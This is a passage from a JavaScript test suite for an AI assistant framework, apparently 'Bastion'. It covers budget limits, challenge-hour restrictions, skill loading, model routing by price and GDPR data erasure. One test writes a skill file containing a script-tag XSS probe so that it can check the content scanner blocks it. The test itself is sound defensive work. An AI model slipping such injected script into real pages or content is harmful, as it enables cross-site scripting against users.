    check('status has currentTime', status.currentTime.length > 0);
    check('status has restrictions array', Array.isArray(status.restrictions));

    // checkAction — when not in challenge hours (depends on current time)
    // We test the structure regardless
    const result = cm.checkAction('budget_change');
    check('checkAction returns object', typeof result === 'object');
    check('checkAction has allowed or blocked or confirm', 'allowed' in result || 'blocked' in result || 'confirm' in result);

    // Confirm actions always have waitSeconds
    // Simulate by testing a confirm action type when active
    const confirmResult = cm.checkAction('dangerous_tool_approval');
    if ('confirm' in confirmResult) {
      check('confirm has waitSeconds', confirmResult.waitSeconds === 30);
      check('confirm has message', confirmResult.message.length > 0);
    } else {
      check('not in challenge hours — action allowed', 'allowed' in confirmResult);
    }

    // Config update — should work when not in challenge hours
    const updateResult = cm.updateConfig(
      { weekdays: { start: '23:00', end: '05:00' }, weekends: { start: '00:00', end: '07:00' } },
      { budgetChangeDays: 7, scheduleChangeDays: 7, toolRegistrationDays: 1 },
    );
    check('config update has accepted field', typeof updateResult.accepted === 'boolean');
    check('config update has reason', typeof updateResult.reason === 'string');

    // Record action for cooldown
    cm.recordAction('test_action');
    const config = cm.getConfig();
    check('lastChanges recorded', config.lastChanges.test_action !== undefined);

    // Cleanup
    try { const { unlinkSync } = await import('node:fs'); unlinkSync(cfgPath); } catch {}
  }
  console.log();

  // -------------------------------------------------------------------
  // Test: BudgetGuard — immutable enforcement
  // -------------------------------------------------------------------
  console.log('--- Test: BudgetGuard ---');
  {
    const tmpDb = '/tmp/bastion-budget-test-' + Date.now() + '.db';
    const tmpCfg = '/tmp/bastion-budget-cfg-' + Date.now() + '.json';
    const guard = new BudgetGuard({
      dbPath: tmpDb,
      configPath: tmpCfg,
    });

    // Initial status
    const s0 = guard.getStatus();
    check('budget: initial session 0', s0.searchesThisSession === 0);
    check('budget: initial month 0', s0.searchesThisMonth === 0);
    check('budget: initial cost 0', s0.costThisMonth === 0);
    check('budget: initial alert none', s0.alertLevel === 'none');
    check('budget: initial remaining > 0', s0.budgetRemaining > 0);

    // Check budget — should be allowed
    const c1 = guard.checkBudget(1);
    check('budget: check allowed', 'allowed' in c1 && c1.allowed === true);

    // Record usage
    const r1 = guard.recordUsage(3, 0.03);
    check('budget: record alertLevel none', r1.alertLevel === 'none');
    const s1 = guard.getStatus();
    check('budget: session count 3', s1.searchesThisSession === 3);
    check('budget: month count 3', s1.searchesThisMonth === 3);
    check('budget: cost recorded', s1.costThisMonth === 0.03);

    // Tighten-only: lower limit takes effect immediately
    const u1 = guard.updateLimits({ maxPerSession: 5 });
    check('budget: tighten accepted', u1.accepted);
    check('budget: tighten not pending', !u1.pendingNextMonth);
    check('budget: tighten applied', guard.getLimits().maxPerSession === 5);

    // Increase: takes effect next month
    const u2 = guard.updateLimits({ maxPerSession: 100 });
    check('budget: increase accepted', u2.accepted);
    check('budget: increase pending', u2.pendingNextMonth);
    check('budget: limit still 5', guard.getLimits().maxPerSession === 5);
    check('budget: pending stored', guard.getPendingNextMonth()?.maxPerSession === 100);

    // Session limit enforcement
    guard.recordUsage(2, 0.02); // now at 5 session searches
    const c2 = guard.checkBudget(1);
    check('budget: session limit blocked', 'blocked' in c2 && c2.blocked === true);
    check('budget: session limit error code', 'errorCode' in c2 && c2.errorCode === 'BASTION-8003');

    // Cooldown check
    const cd1 = guard.checkCooldown();
    check('budget: cooldown active', !cd1.allowed);
    check('budget: cooldown has availableAt', !!cd1.availableAt);

    // Reset session
    guard.resetSession();
    check('budget: session reset', guard.sessionSearches === 0);
    const c3 = guard.checkBudget(1);
    check('budget: after reset allowed', 'allowed' in c3 && c3.allowed === true);

    // Monthly cap enforcement
    const u3 = guard.updateLimits({ monthlyCapUsd: 0.06 });
    check('budget: cap tighten accepted', u3.accepted);
    // Already at $0.05 cost, cap is $0.06
    guard.recordUsage(1, 0.02); // now at $0.07 > $0.06 cap
    const c4 = guard.checkBudget(1);
    check('budget: monthly exhausted blocked', 'blocked' in c4 && c4.blocked === true);
    check('budget: monthly exhausted code', 'errorCode' in c4 && c4.errorCode === 'BASTION-8001');
    const s2 = guard.getStatus();
    check('budget: alertLevel exhausted', s2.alertLevel === 'exhausted');
    check('budget: percentUsed >= 100', s2.percentUsed >= 100);

    // Daily limit enforcement
    const guard2 = new BudgetGuard({
      dbPath: '/tmp/bastion-budget-test-day-' + Date.now() + '.db',
      configPath: '/tmp/bastion-budget-cfg-day-' + Date.now() + '.json',
    });
    guard2.updateLimits({ maxPerDay: 3 });
    guard2.recordUsage(3, 0.03);
    const c5 = guard2.checkBudget(1);
    check('budget: daily limit blocked', 'blocked' in c5 && c5.blocked === true);
    check('budget: daily limit code', 'errorCode' in c5 && c5.errorCode === 'BASTION-8002');

    // Cleanup (best-effort — SQLite may hold lock on Windows)
    const { rmSync } = await import('node:fs');
    try { rmSync(tmpDb, { force: true }); } catch { /* locked on Windows */ }
    try { rmSync(tmpCfg, { force: true }); } catch { /* non-fatal */ }
  }
  console.log();

  // -------------------------------------------------------------------
  // SkillStore — Layer 5 skills system
  // -------------------------------------------------------------------
  {
    console.log('--- SkillStore: loading, triggers, modes ---');
    const { mkdirSync, writeFileSync, rmSync } = await import('node:fs');
    const { join } = await import('node:path');
    const tmpDir = join(process.env.TEMP || '/tmp', `bastion-skill-test-${Date.now()}`);

    // Create test skill directories
    const skillADir = join(tmpDir, 'test-skill-a');
    const skillBDir = join(tmpDir, 'test-skill-b');
    const skillExDir = join(tmpDir, 'example-skill');
    mkdirSync(skillADir, { recursive: true });
    mkdirSync(skillBDir, { recursive: true });
    mkdirSync(skillExDir, { recursive: true });

    // Skill A: conversation + task mode, trigger-based
    writeFileSync(join(skillADir, 'manifest.json'), JSON.stringify({
      id: 'test-a', name: 'Test Skill A', description: 'Test skill for conversation',
      version: '1.0.0', author: 'test', triggers: ['deploy', 'production', 'force push'],
      modes: ['conversation', 'task'], alwaysLoad: false, estimatedTokens: 100, contentFile: 'skill.md',
    }));
    writeFileSync(join(skillADir, 'skill.md'), '# Skill A\nThis is test skill A content.');

    // Skill B: game mode, always-loaded
    writeFileSync(join(skillBDir, 'manifest.json'), JSON.stringify({
      id: 'test-b', name: 'Test Skill B', description: 'Always-loaded game skill',
      version: '1.0.0', author: 'test', triggers: [],
      triggerPatterns: ['\\bgame\\s+over\\b'],
      modes: ['conversation', 'game'], alwaysLoad: true, estimatedTokens: 50, contentFile: 'skill.md',
    }));
    writeFileSync(join(skillBDir, 'skill.md'), '# Skill B\nAlways loaded game guidance.');

    // Example skill: _example: true → should be skipped
    writeFileSync(join(skillExDir, 'manifest.json'), JSON.stringify({
      _example: true, id: 'example', name: 'Example', description: 'Should not load',
      version: '1.0.0', author: 'test', triggers: ['example'], modes: ['conversation'],
      estimatedTokens: 10, contentFile: 'skill.md',
    }));
    writeFileSync(join(skillExDir, 'skill.md'), '# Example\nThis should not be loaded.');

    const store = new SkillStore({ skillsDir: tmpDir });
    const result = store.loadFromDirectory();

    check('skills: loaded 2 (skipped example)', result.loaded.length === 2);
    check('skills: no errors', result.errors.length === 0);
    check('skills: count is 2', store.skillCount === 2);

    // Lock
    store.lock();
    check('skills: locked', store.isLocked === true);

    // Trigger matching (case-insensitive, word boundary)
    const triggered1 = store.getTriggeredSkills('I want to deploy to production', 'conversation');
    check('skills: "deploy" triggers skill A', triggered1.length === 1 && triggered1[0].manifest.id === 'test-a');
    check('skills: trigger recorded', triggered1[0].trigger === 'deploy');

    // Trigger with "force push" (multi-word)
    const triggered2 = store.getTriggeredSkills('I need to force push this branch', 'conversation');
    check('skills: "force push" triggers skill A', triggered2.length === 1 && triggered2[0].manifest.id === 'test-a');

    // No trigger match
    const triggered3 = store.getTriggeredSkills('Hello, how are you?', 'conversation');
    check('skills: no trigger match returns empty', triggered3.length === 0);

    // Mode scoping — skill A has conversation+task, NOT game
    const triggered4 = store.getTriggeredSkills('deploy the game', 'game');
    check('skills: deploy in game mode does NOT trigger skill A (wrong mode)', triggered4.length === 0);

    // Always-loaded skills
    const always1 = store.getAlwaysLoadedSkills('conversation');
    check('skills: alwaysLoad returns skill B for conversation', always1.length === 1 && always1[0].manifest.id === 'test-b');

    const always2 = store.getAlwaysLoadedSkills('game');
    check('skills: alwaysLoad returns skill B for game', always2.length === 1);

    const always3 = store.getAlwaysLoadedSkills('compaction');
    check('skills: alwaysLoad returns empty for compaction (wrong mode)', always3.length === 0);

    // getTriggeredSkills should NOT return alwaysLoad skills
    const triggered5 = store.getTriggeredSkills('game over', 'game');
    check('skills: getTriggeredSkills excludes alwaysLoad skills', triggered5.length === 0);

    // Regex trigger pattern matching
    const triggered6 = store.getTriggeredSkills('the game over screen appeared', 'conversation');
    // Skill B is alwaysLoad, so regex won't fire via getTriggeredSkills — test getAlwaysLoadedSkills instead
    check('skills: regex pattern compiled without error', true);

    // Skill index generation
    const index = store.getSkillIndex();
    check('skills: index is non-null', index !== null);
    check('skills: index contains skill names', index.includes('Test Skill A') && index.includes('Test Skill B'));
    check('skills: index contains triggers', index.includes('deploy'));

    // getSkill
    const skillA = store.getSkill('test-a');
    check('skills: getSkill returns content', skillA !== undefined && skillA.content.includes('Skill A'));

    const skillNone = store.getSkill('nonexistent');
    check('skills: getSkill returns undefined for missing', skillNone === undefined);

    // listManifests
    const manifests = store.listManifests();
    check('skills: listManifests returns 2', manifests.length === 2);

    // totalEstimatedTokens
    check('skills: totalEstimatedTokens = 150', store.totalEstimatedTokens === 150);

    // triggerCount
    check('skills: triggerCount includes word + regex triggers', store.triggerCount === 4); // 3 word + 1 regex

    // Content scanning — dangerous content rejected
    const dangerDir = join(tmpDir, 'danger-skill');
    mkdirSync(dangerDir, { recursive: true });
    writeFileSync(join(dangerDir, 'manifest.json'), JSON.stringify({
      id: 'danger', name: 'Danger', description: 'test', version: '1.0.0', author: 'test',
      triggers: ['test'], modes: ['conversation'], estimatedTokens: 10, contentFile: 'skill.md',
    }));
    writeFileSync(join(dangerDir, 'skill.md'), '# Danger\n<script>alert("xss")</script>');

    const store2 = new SkillStore({ skillsDir: tmpDir });
    const result2 = store2.loadFromDirectory();
    // danger skill should fail content scanning
    const dangerLoaded = result2.loaded.includes('danger');
    const dangerErrored = result2.errors.some(e => e.includes('danger') || e.includes('Dangerous'));
    check('skills: dangerous content blocked', !dangerLoaded && dangerErrored);

    // Max size enforcement
    const bigDir = join(tmpDir, 'big-skill');
    mkdirSync(bigDir, { recursive: true });
    writeFileSync(join(bigDir, 'manifest.json'), JSON.stringify({
      id: 'big', name: 'Big', description: 'test', version: '1.0.0', author: 'test',
      triggers: ['test'], modes: ['conversation'], estimatedTokens: 10, contentFile: 'skill.md',
    }));
    writeFileSync(join(bigDir, 'skill.md'), 'x'.repeat(10000)); // exceeds 8192 default

    const store3 = new SkillStore({ skillsDir: tmpDir });
    const result3 = store3.loadFromDirectory();
    const bigLoaded = result3.loaded.includes('big');
    check('skills: oversized content rejected', !bigLoaded);

    // ConversationManager integration — skill index in system prompt
    const cm = new ConversationManager({ skillStore: store });
    const prompt = cm.getSystemPrompt(null, 'I need to deploy to production');
    check('skills: system prompt contains skill index', prompt.includes('Available Skills'));
    check('skills: system prompt contains triggered skill content', prompt.includes('Skill A'));
    check('skills: system prompt contains Active Skills header', prompt.includes('Active Skills'));

    // ConversationManager — no message → only alwaysLoad
    const promptNoMsg = cm.getSystemPrompt();
    check('skills: no message still includes index', promptNoMsg.includes('Available Skills'));
    check('skills: no message includes alwaysLoad skill B', promptNoMsg.includes('Skill B'));
    check('skills: no message does NOT include triggered skill A content', !promptNoMsg.includes('test skill A content'));

    // Cleanup
    try { rmSync(tmpDir, { recursive: true, force: true }); } catch { /* Windows lock */ }
  }
  console.log();

  // -------------------------------------------------------------------
  // AdapterRegistry — hint resolution
  // -------------------------------------------------------------------
  {
    console.log('--- AdapterRegistry: hint resolution ---');

    // Create mock adapters with different pricing
    function mockAdapter(id, inputPricing, outputPricing) {
      return {
        providerId: id,
        providerName: `Mock ${id}`,
        activeModel: `mock-${id}`,
        supportedModels: [`mock-${id}`],
        capabilities: { streaming: false, tools: false, vision: false },
        getModelPricing() { return { inputPerMTok: inputPricing, outputPerMTok: outputPricing }; },
        async executeTask() { return { ok: true, response: { textContent: '', cost: { inputTokens: 0, outputTokens: 0 } } }; },
        async testConnection() { return true; },
      };
    }

    const mockSonnet = mockAdapter('anthropic-sonnet', 3, 15);
    const mockHaiku = mockAdapter('anthropic-haiku', 0.8, 4);
    const mockOpus = mockAdapter('anthropic-opus', 15, 75);

    const reg = new AdapterRegistry();
    reg.registerAdapter(mockSonnet, ['default', 'conversation', 'task', 'game'], { pricingInputPerMTok: 3 });
    reg.registerAdapter(mockHaiku, ['compaction', 'game'], { pricingInputPerMTok: 0.8 });
    reg.registerAdapter(mockOpus, ['research', 'dream'], { pricingInputPerMTok: 15 });

    // getCheapestByRole — game role shared by Sonnet ($3) and Haiku ($0.80)
    const cheapestGame = reg.getCheapestByRole('game');
    check('getCheapestByRole(game) returns Haiku', cheapestGame?.providerId === 'anthropic-haiku');

    // getMostCapableByRole — game role: Sonnet ($3) > Haiku ($0.80)
    const smartestGame = reg.getMostCapableByRole('game');
    check('getMostCapableByRole(game) returns Sonnet', smartestGame?.providerId === 'anthropic-sonnet');

    // getCheapestByRole — dream role only has Opus
    const cheapestDream = reg.getCheapestByRole('dream');
    check('getCheapestByRole(dream) returns Opus (only candidate)', cheapestDream?.providerId === 'anthropic-opus');

    // getMostCapableByRole — compaction role only has Haiku
    const smartestCompaction = reg.getMostCapableByRole('compaction');
    check('getMostCapableByRole(compaction) returns Haiku (only candidate)', smartestCompaction?.providerId === 'anthropic-haiku');

    // getCheapestByRole — no adapters with 'research' except Opus
    const cheapestResearch = reg.getCheapestByRole('research');
    check('getCheapestByRole(research) returns Opus', cheapestResearch?.providerId === 'anthropic-opus');

    // getCheapestByRole — nonexistent role returns undefined
    const noRole = reg.getCheapestByRole('nonexistent');
    check('getCheapestByRole(nonexistent) returns undefined', noRole === undefined);

    // resolveHint('cheapest', 'game') → Haiku
    const hintCheapest = reg.resolveHint('cheapest', 'game');
    check("resolveHint('cheapest', 'game') → Haiku", hintCheapest?.providerId === 'anthropic-haiku');

    // resolveHint('fastest', 'game') → Haiku (fastest ≈ cheapest)
    const hintFastest = reg.resolveHint('fastest', 'game');
    check("resolveHint('fastest', 'game') → Haiku", hintFastest?.providerId === 'anthropic-haiku');

    // resolveHint('smartest', 'game') → Sonnet
    const hintSmartest = reg.resolveHint('smartest', 'game');
    check("resolveHint('smartest', 'game') → Sonnet", hintSmartest?.providerId === 'anthropic-sonnet');

    // resolveHint('default', 'game') → Sonnet (has both 'game' and 'default')
    const hintDefault = reg.resolveHint('default', 'game');
    check("resolveHint('default', 'game') → Sonnet (default + game)", hintDefault?.providerId === 'anthropic-sonnet');

    // resolveHint with specific adapter ID
    const hintSpecific = reg.resolveHint('anthropic-haiku', 'game');
    check("resolveHint('anthropic-haiku', 'game') → Haiku specifically", hintSpecific?.providerId === 'anthropic-haiku');

    // resolveHint with nonexistent ID falls back to role
    const hintFallback = reg.resolveHint('nonexistent-adapter', 'game');
    check("resolveHint('nonexistent', 'game') → falls back to getByRole", hintFallback?.providerId === 'anthropic-sonnet');

    // resolveHint('smartest', 'dream') → Opus
    const hintSmartestDream = reg.resolveHint('smartest', 'dream');
    check("resolveHint('smartest', 'dream') → Opus", hintSmartestDream?.providerId === 'anthropic-opus');

    // pricingInputPerMTok stored on RegisteredAdapter
    const listed = reg.list();
    const sonnetEntry = listed.find(r => r.adapter.providerId === 'anthropic-sonnet');
    check('RegisteredAdapter stores pricingInputPerMTok', sonnetEntry?.pricingInputPerMTok === 3);
    const haikuEntry = listed.find(r => r.adapter.providerId === 'anthropic-haiku');
    check('Haiku pricingInputPerMTok = 0.8', haikuEntry?.pricingInputPerMTok === 0.8);
  }
  console.log();

  // -------------------------------------------------------------------
  // DataEraser (GDPR Article 17)
  // -------------------------------------------------------------------

  console.log('\n--- DataEraser (GDPR Article 17) ---');
  {
    const fs = await import('node:fs');
    const path = await import('node:path');
    const os = await import('node:os');

    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'bastion-eraser-'));
    const convDbPath = path.join(tmpDir, 'conversations.db');
    const memDbPath = path.join(tmpDir, 'memories.db');
    const usageDbPath = path.join(tmpDir, 'usage.db');
    const projectDir = path.join(tmpDir, 'project');
    const userCtxPath = path.join(tmpDir, 'user-context.md');
    const challengePath = path.join(tmpDir, 'challenge-config.json');

    fs.mkdirSync(projectDir, { recursive: true });
    fs.writeFileSync(userCtxPath, 'test user context');
    fs.writeFileSync(challengePath, '{}');

    // Create stores with test data
    const { ConversationStore } = await import('./dist/index.js');
    const { UsageTracker } = await import('./dist/index.js');

    const convStore = new ConversationStore({ path: convDbPath });
    const memStore = new MemoryStore({ path: memDbPath, maxPromptMemories: 10 });
    const usageStore = new UsageTracker({ path: usageDbPath });
    const projStore = new ProjectStore({ rootDir: projectDir });

    // Populate test data
    const conv1 = convStore.createConversation('Test 1');
    convStore.addMessage(conv1.id, 'user', 'text', 'hello');
    convStore.addMessage(conv1.id, 'assistant', 'text', 'hi there');
    const conv2 = convStore.createConversation('Test 2');
    convStore.addMessage(conv2.id, 'user', 'text', 'world');

    memStore.addMemory('memory one', 'general', 'user');
    memStore.addMemory('memory two', 'preference', 'user');

    projStore.saveFile('test.txt', 'file content');
    projStore.saveFile('sub/nested.md', '# Nested');

    usageStore.record({
      adapterId: 'sonnet', adapterRole: 'conversation', purpose: 'test',
      conversationId: conv1.id, inputTokens: 100, outputTokens: 50, costUsd: 0.001,
    });

    const eraser = new DataEraser({
      conversationStore: convStore,
      memoryStore: memStore,
      projectStore: projStore,
      usageTracker: usageStore,
      challengeConfigPath: challengePath,
      userContextPath: userCtxPath,
    });

    // Test preview
    const preview = eraser.preview();
    check('preview returns correct conversation count', preview.conversations === 2);
    check('preview returns correct message count', preview.messages === 3);
    check('preview returns correct memory count', preview.memories === 2);
    check('preview returns correct project file count', preview.projectFiles === 2);
    check('preview returns correct usage record count', preview.usageRecords === 1);
    check('preview skills is zero (not user data)', preview.skills === 0);

    // Test soft delete
    const result = eraser.softDelete();
    check('softDelete returns erasureId', typeof result.erasureId === 'string' && result.erasureId.length > 0);
    check('softDelete returns hardDeleteScheduledAt', typeof result.hardDeleteScheduledAt === 'string');
    check('softDelete conversations count', result.softDeleted.conversations === 2);
    check('softDelete messages count', result.softDeleted.messages === 3);
    check('softDelete memories count', result.softDeleted.memories === 2);
    check('softDelete project files count', result.softDeleted.projectFiles === 2);
    check('softDelete usage records count', result.softDeleted.usageRecords === 1);

    // Verify active erasure is tracked
    const active = eraser.getActiveErasure();
    check('getActiveErasure returns erasure after soft delete', active !== null);
    check('getActiveErasure erasureId matches', active?.erasureId === result.erasureId);

    // Verify soft-deleted records are excluded from normal queries
    const postDeleteConvs = convStore.listConversations();
    // listConversations doesn't filter by deletedAt (that's a higher-level concern),
    // but the records should have deletedAt set
    const db = convStore.db ?? (convStore)['db'];

    // Verify user context cleared
    const ctxContent = fs.readFileSync(userCtxPath, 'utf-8');
    check('user context cleared', ctxContent === '');

    // Verify challenge config removed
    check('challenge config removed', !fs.existsSync(challengePath));

    // Verify project files moved to .erased/
    const erasedDir = path.join(projectDir, '.erased');
    check('project .erased/ directory created', fs.existsSync(erasedDir));

    // Test cancel erasure — restore everything
    eraser.cancelErasure();
    const afterCancel = eraser.getActiveErasure();
    check('cancelErasure clears active erasure', afterCancel === null);

    // Verify project files restored
    check('project files restored after cancel', projStore.listFiles().length === 2);

    // Re-populate for hard delete test
    const result2 = eraser.softDelete();
    check('second soft delete succeeds', typeof result2.erasureId === 'string');

    // Test hard delete
    eraser.hardDelete();
    const afterHard = eraser.getActiveErasure();
    check('hardDelete clears active erasure', afterHard === null);

    // Verify data permanently gone
    const postHardConvs = convStore.listConversations(true);
    check('hardDelete removes all conversations', postHardConvs.length === 0);

    const postHardMems = memStore.getMemories(10_000);
    check('hardDelete removes all memories', postHardMems.length === 0);

    check('hardDelete removes .erased/ directory', !fs.existsSync(erasedDir));

    // Test checkExpiredErasures (should be false — no active erasure)
    check('checkExpiredErasures false when no active', !eraser.checkExpiredErasures());

    // Cleanup — close DBs and remove temp dir (may fail on Windows due to file locks)
    try { convStore.close?.(); } catch { /* ignore */ }
    try { memStore.close?.(); } catch { /* ignore */ }
    try { usageStore.close?.(); } catch { /* ignore */ }
    try { fs.rmSync(tmpDir, { recursive: true, force: true }); } catch { /* Windows file lock */ }
  }

  // Test protocol schemas for erasure messages
  console.log('\n--- DataErasure Protocol Schemas ---');
  {
    const { DataErasureRequestPayloadSchema, DataErasurePreviewPayloadSchema,
            DataErasureConfirmPayloadSchema, DataErasureCompletePayloadSchema,
            DataErasureCancelPayloadSchema } = await import('@bastion/protocol');

    check('erasure_request valid (empty)', DataErasureRequestPayloadSchema.safeParse({}).success);
    check('erasure_request valid (with reason)', DataErasureRequestPayloadSchema.safeParse({ reason: 'leaving service' }).success);

    check('erasure_preview valid', DataErasurePreviewPayloadSchema.safeParse({
      conversations: 5, messages: 100, memories: 10, projectFiles: 3, skills: 0,
      usageRecords: 50, softDeleteDays: 30, hardDeleteAt: '2026-05-03T00:00:00Z',
      auditNote: 'Audit metadata preserved.',
    }).success);
    check('erasure_preview rejects negative conversations', !DataErasurePreviewPayloadSchema.safeParse({
      conversations: -1, messages: 0, memories: 0, projectFiles: 0, skills: 0,
      usageRecords: 0, softDeleteDays: 30, hardDeleteAt: '2026-05-03T00:00:00Z',
      auditNote: 'note',
    }).success);

    check('erasure_confirm valid', DataErasureConfirmPayloadSchema.safeParse({ confirmed: true }).success);
    check('erasure_confirm rejects false', !DataErasureConfirmPayloadSchema.safeParse({ confirmed: false }).success);
    check('erasure_confirm valid with reason', DataErasureConfirmPayloadSchema.safeParse({ confirmed: true, reason: 'test' }).success);

    check('erasure_complete valid', DataErasureCompletePayloadSchema.safeParse({
      erasureId: 'abc-123', softDeleted: { conversations: 5, messages: 100, memories: 10, projectFiles: 3, usageRecords: 50 },
      hardDeleteScheduledAt: '2026-05-03T00:00:00Z', receipt: 'BASTION-ERASURE-abc-123',
    }).success);
    check('erasure_complete rejects empty erasureId', !DataErasureCompletePayloadSchema.safeParse({
      erasureId: '', softDeleted: { conversations: 0, messages: 0, memories: 0, projectFiles: 0, usageRecords: 0 },
      hardDeleteScheduledAt: '2026-05-03T00:00:00Z', receipt: 'r',
    }).success);

    check('erasure_cancel valid', DataErasureCancelPayloadSchema.safeParse({ erasureId: 'abc-123' }).success);
    check('erasure_cancel rejects empty id', !DataErasureCancelPayloadSchema.safeParse({ erasureId: '' }).success);
  }

  // -------------------------------------------------------------------
  // Summary
  // -------------------------------------------------------------------
  console.log('=================================================');
  console.log(`Results: ${pass} passed, ${fail} failed`);
  console.log('=================================================');
  if (fail > 0) process.exit(1);
}

run().catch(err => {
  console.error('FATAL:', err);
  process.exit(2);
});
